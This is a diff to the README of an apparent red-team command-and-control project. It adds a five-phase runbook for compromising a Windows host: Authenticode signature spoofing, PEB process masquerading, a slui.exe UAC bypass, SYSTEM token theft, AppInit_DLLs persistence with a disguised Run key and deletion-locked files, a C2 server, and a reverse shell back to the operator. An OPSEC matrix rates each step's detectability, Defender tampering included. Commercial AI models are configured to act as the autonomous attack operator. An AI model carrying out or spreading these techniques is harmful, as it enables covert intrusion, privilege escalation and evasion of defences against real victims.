@@ -19,8 +19,15 @@
    - 3.3 [The Human-in-the-Loop Approval Workflow](#33-the-human-in-the-loop-approval-workflow)
    - 3.4 [Example Natural Language Operations](#34-example-natural-language-operations)
    - 3.5 [Headless REPL Mode (`agent.py`)](#35-headless-repl-mode-agentpy)
-4. [Offline Lab Simulation (Without Windows VM)](#4-offline-lab-simulation-without-windows-vm)
-5. [Troubleshooting Common Issues](#5-troubleshooting-common-issues)
+4. [End-to-End Adversary Simulation Runbook](#4-end-to-end-adversary-simulation-runbook)
+   - 4.1 [Phase 1: Binary Staging & Authenticode Spoofing](#41-phase-1-binary-staging--authenticode-spoofing)
+   - 4.2 [Phase 2: Loader Execution, PEB Masquerading & PrivEsc](#42-phase-2-loader-execution-peb-masquerading--privesc)
+   - 4.3 [Phase 3: Persistence Injection & Watchdog Arming](#43-phase-3-persistence-injection--watchdog-arming)
+   - 4.4 [Phase 4: Autonomous C2 & Live Shell Access](#44-phase-4-autonomous-c2--live-shell-access)
+   - 4.5 [Phase 5: Authorized Teardown & Remediation](#45-phase-5-authorized-teardown--remediation)
+5. [Operational OPSEC & Noise Profile Matrix](#5-operational-opsec--noise-profile-matrix)
+6. [Offline Lab Simulation (Without Windows VM)](#6-offline-lab-simulation-without-windows-vm)
+7. [Troubleshooting Common Issues](#7-troubleshooting-common-issues)
 
 ---
 
@@ -216,6 +223,11 @@ C:\Users\Victim>
 - **`shell status`** : Checks whether the detached reverse shell is still alive.
 - **`shell stop`** : Gracefully closes the active reverse shell connection.
 
+#### Advanced Shell OPSEC & Terminal Nuances:
+- **Sub-Prompt & Interactive Binaries**: Avoid invoking blocking utilities (e.g., `diskpart`, `powershell` interactive child-consoles, or `ssh`) that require standard Win32 console handles directly inside the raw stream, as they may deadlock line buffering. Always pass single commands directly (e.g., `powershell.exe -NonInteractive -Command "..."`).
+- **NAT & Port-Forwarding Requirements**: The victim implant connects **outbound** to port `4445`. When testing across subnets or cloud VPCs, ensure your operator host has TCP 4445 accessible and port-forwarded from any external IP.
+- **Encoding & Output Cleansing**: The raw shell passes UTF-8 and code page 437/1252 strings directly. If output appears garbled after running scripts, issue `chcp 65001` to switch the target Windows command session to UTF-8.
+
 ---
 
 ## 3. Operating with the Autonomous AI Agent (`agent_tui.py`)
@@ -323,7 +335,130 @@ python3 agent.py --provider openrouter --model anthropic/claude-3.5-sonnet
 
 ---
 
-## 4. Offline Lab Simulation (Without Windows VM)
+## 4. End-to-End Adversary Simulation Runbook
+
+This runbook guides red-team operators through a full 5-phase adversary simulation campaign against an authorized lab Windows target.
+
+```mermaid
+graph TD
+    P1[Phase 1: Binary Spoofing] -->|Authenticode Transplant| P2[Phase 2: Initial Loader & PrivEsc]
+    P2 -->|PEB Spoof + UAC + Token Steal| P3[Phase 3: Persistence & Watchdog]
+    P3 -->|AppInit_DLLs + DACL Lock| P4[Phase 4: Autonomous C2 & Shell]
+    P4 -->|Investigation & Objectives| P5[Phase 5: Remediation via SAFE /remove]
+```
+
+---
+
+### 4.1 Phase 1: Binary Staging & Authenticode Spoofing
+Before dropping custom binaries, transplant Authenticode digital signatures to test endpoint signature verification heuristics:
+
+```bash
+# 1. Inspect PE structure and security directory of a legitimate signed binary (e.g., calc.exe)
+python3 file_analyzer.py -s /path/to/calc.exe
+
+# 2. Transplant the valid certificate onto our compiled dropper
+python3 cert_spoofer.py --malware ./main.exe --cert /path/to/calc.exe --no-upload
+
+# 3. Verify that the Security Directory has been adjusted in the target binary
+python3 file_analyzer.py -s ./main.exe
+```
+
+---
+
+### 4.2 Phase 2: Loader Execution, PEB Masquerading & PrivEsc
+Deliver `main.exe` (compiled from [`red.cpp`](file:///Users/matanmishali/AntiGravity/AgentRed/red.cpp)) to the target Windows host:
+
+1. **In-Memory PEB Masquerading**:
+   - `main.exe` enumerates running processes and identifies a signed, legitimate process (e.g., `spoolsv.exe`, `explorer.exe`) verified by `WinVerifyTrust`.
+   - It queries target memory via `NtQueryInformationProcess` and overwrites its own `RTL_USER_PROCESS_PARAMETERS` (`CommandLine`, `ImagePathName`, `WindowTitle`) so live process inspection tools (Process Explorer, Task Manager) display false process metadata.
+2. **Zero-Prompt UAC Auto-Elevation**:
+   - Creates a user-writable hijack registry entry at `HKCU\Software\Classes\exefile\shell\open\command`.
+   - Executes auto-elevated `C:\Windows\System32\slui.exe` using `ShellExecuteW("runas", ...)`.
+   - `slui.exe` elevates without prompting the user and runs our payload in a High-Integrity context.
+3. **Token Stealing to SYSTEM**:
+   - Acquires `SeDebugPrivilege`.
+   - Opens `winlogon.exe` (running as `NT AUTHORITY\SYSTEM`), duplicates its primary token via `DuplicateTokenEx`, and executes the persistence registration commands under SYSTEM integrity.
+
+---
+
+### 4.3 Phase 3: Persistence Injection & Watchdog Arming
+Stage `AppInit_DLLs.dll` and `SAFE.exe` in `%USERPROFILE%`:
+
+1. **AppInit_DLLs Registration**:
+   The loader registers the DLL path in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`:
+   - `AppInit_DLLs` = `C:%HOMEPATH%\AppInit_DLLs.dll`
+   - `LoadAppInit_DLLs` = `1`
+   - `RequireSignedAppInit_DLLs` = `0`
+   Every GUI desktop application loading `user32.dll` automatically injects `AppInit_DLLs.dll`.
+2. **Watchdog Arming & DACL Locking**:
+   - `SAFE.exe` is added to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (`"Windows Security Health"`).
+   - Strict Discretionary Access Control Lists (DACLs) are applied to both `AppInit_DLLs.dll` and `SAFE.exe`, denying `DELETE` permissions to `Everyone`.
+   - On every login, `SAFE.exe` silently checks and restores any purged registry keys or altered file permissions.
+
+---
+
+### 4.4 Phase 4: Autonomous C2 & Live Shell Access
+Once the implant is resident in memory:
+
+1. **Launch the C2 Relay Server**:
+   ```bash
+   python3 c2_server/server.py --host 0.0.0.0 --port 4444 --token secret123
+   ```
+2. **Engage with the Autonomous AI Operator**:
+   ```bash
+   export OPENROUTER_API_KEY="sk-or-v1-..."
+   python3 agent/agent_tui.py --host 127.0.0.1 --port 4444 --token secret123 \
+       --provider openrouter --model anthropic/claude-3.5-sonnet
+   ```
+3. **Live Window Surveillance & Out-of-Band Interactive Shell**:
+   - Enable window monitoring:
+     ```
+     c2> notify start
+     ```
+   - Spawn direct interactive reverse shell:
+     ```
+     c2> shell 192.168.1.5 4445 cmd.exe
+     ```
+   - Use `Ctrl+]` to detach from the shell at any time while preserving the session.
+
+---
+
+### 4.5 Phase 5: Authorized Teardown & Remediation
+To return the lab machine to a baseline clean state following the exercise:
+
+```cmd
+# Run SAFE.exe with the /remove switch as Administrator:
+C:\Users\Victim\SAFE.exe /remove
+```
+What `/remove` automatically executes:
+- Unlocks the restrictive file DACLs on `AppInit_DLLs.dll` and `SAFE.exe`.
+- Resets `AppInit_DLLs` and sets `LoadAppInit_DLLs` to `0` in `HKLM`.
+- Removes the `"Windows Security Health"` entry from `HKCU\Run`.
+- Cleans up residual file association keys in `HKCU\Software\Classes\exefile`.
+- Terminates watchdog mutexes (`Global\__C2SafeMtx__`).
+
+---
+
+## 5. Operational OPSEC & Noise Profile Matrix
+
+Every offensive operation generates varying levels of endpoint telemetry. Use this matrix to assess detection risks during adversary emulation:
+
+| Operation / Capability | Target Mechanism | Disk Artifacts | Process Lineage Impact | Primary Telemetry Generated | OPSEC Rating |
+| :--- | :--- | :--- | :--- | :--- | :--- |
+| **System Profiling** (`sysinfo`, `processes`) | `Toolhelp32` API calls | None | Internal to implant process | No log entries generated | 🟢 **Low** |
+| **Active Socket Audit** (`network`) | `GetExtendedTcpTable` | None | Internal to implant process | No log entries generated | 🟢 **Low** |
+| **Window Event Hooking** (`notify start`) | `SetWinEventHook` | None | Internal GUI hook | User-mode events only | 🟢 **Low** |
+| **PEB Masquerading** (`process_steal.h`) | Runtime memory rewrite | None | Spoofs `ProcessBasicInformation` | Volatility VAD discrepancy | 🟡 **Medium** |
+| **Registry Read** (`reg read`) | `RegOpenKeyEx` | None | Read operations | Sysmon Event ID 12/13 (if auditing reads) | 🟢 **Low** |
+| **Registry Persistence** (`AppInit_DLLs`) | `HKLM\...\Windows` write | DLL on disk | Reg key modification | Sysmon Event ID 13 | 🟠 **High** |
+| **UAC Auto-Elevate** (`red.cpp`) | `slui.exe` association | Temp reg key | `slui.exe` spawns unexpected child | Sysmon Event ID 1 & 13 | 🟠 **High** |
+| **Token Stealing** (`privesc.h`) | `winlogon.exe` open handle | None | High-priv process access | Sysmon Event ID 10 | 🔴 **High** |
+| **Defender Tampering** (`Add-MpPreference`) | PowerShell exclusion command | PowerShell log | `powershell.exe` execution | PowerShell EID 4104, Defender EID 5007 | 🚨 **Extreme** |
+| **Out-of-Band Reverse Shell** (`shell`) | Raw TCP port 4445 | Temp pipes | `cmd.exe` child process | Sysmon Event ID 1 & Event ID 3 | 🟠 **High** |
+
+---
+
+## 6. Offline Lab Simulation (Without Windows VM)
 
 To test the entire stack on macOS or Linux without needing a physical Windows VM, use the included mock harness:
 
@@ -343,7 +478,7 @@ python3 agent_tui.py --host 127.0.0.1 --port 4444 --token labtoken --dry-run
 
 ---
 
-## 5. Troubleshooting Common Issues
+## 7. Troubleshooting Common Issues
 
 | Issue | Cause | Solution |
 | :--- | :--- | :--- |
@@ -351,3 +486,4 @@ python3 agent_tui.py --host 127.0.0.1 --port 4444 --token labtoken --dry-run
 | **"Address already in use"** | Port 4444 or 4445 is already bound by an existing process. | Check active ports with `lsof -i :4444` and terminate the conflicting process. |
 | **"No agent connected"** | `client.py` is connected to the server, but the DLL has not run on the victim. | Verify `AppInit_DLLs.dll` is loaded into a process on the target machine. |
 | **Reverse shell disconnects immediately** | Firewall on operator machine blocking inbound TCP port 4445. | Verify local firewall permits inbound connections on port 4445. |
+
